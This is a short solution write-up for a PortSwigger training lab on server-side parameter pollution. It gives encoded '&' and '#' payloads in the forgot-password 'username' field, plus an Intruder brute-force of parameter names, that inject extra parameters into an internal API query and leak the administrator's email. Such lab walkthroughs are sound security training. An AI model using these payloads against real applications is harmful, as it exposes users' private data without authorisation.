# Lab 04 — Exploiting server-side parameter pollution in a query string

> **Practitioner** · [Official lab](https://portswigger.net/web-security/api-testing/server-side-parameter-pollution/lab-exploiting-server-side-parameter-pollution-in-query-string)

**Entry point:** `POST /forgot-password` — `username` is placed into a
server-side query string unescaped.

## Solution

1. Inject an encoded `&`: `username=administrator%26x=y` → *"Parameter is
   not supported"* → the internal API parses our `&`.
2. Truncate with encoded `#`: `username=administrator%23` → *"Field not
   specified"* → there's a `field` parameter.
3. `username=administrator%26field=x%23` → *"Invalid field"* → brute-force
   it (Intruder, built-in **Server-side variable names** list).
4. `field=email` works:

```
username=administrator%26field=email%23
```

→ the response leaks the administrator's email — lab solved.

## Notes

Parameter pollution = your input becomes two parameters in the server's
own request. Encode everything (`%26`, `%23`).
